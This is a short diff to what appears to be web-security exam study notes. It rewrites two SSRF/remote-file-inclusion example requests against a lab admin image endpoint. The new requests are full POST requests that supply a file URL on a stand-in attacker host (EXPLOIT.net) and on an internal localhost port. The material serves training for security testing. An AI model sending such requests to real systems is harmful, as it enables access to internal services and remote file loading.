@@ -2690,11 +2690,21 @@ Host: localhost
 >Below scenario could be exploited using [SSRF](#ssrf---server-side-request-forgery) or RFI. Did not solve this challenge.....  
 
 ```
-/admin-panel/admin-img-file/fileurl=https://EXPLOIT.net/image.sVg
+POST /admin-panel/admin-img-file
+Host: TARGET.net
+Cookie: session=AdminCookieTokenValue
+Referer: https://TARGET.net/admin-panel
+
+csrf=u4r8fg90d7b09j4mm6k67m3&fileurl=https://EXPLOIT.net/image.sVg
 ```  
 
 ```
-/admin-panel/admin-img-file/fileurl=http://localhost:6566/
+POST /admin-panel/admin-img-file
+Host: TARGET.net
+Cookie: session=AdminCookieTokenValue
+Referer: https://TARGET.net/admin-panel
+
+csrf=u4r8fg90d7b09j4mm6k67m3&fileurl=http://localhost:6566/
 ```  
   
 ![RFI function](images/RFI-function.png)  
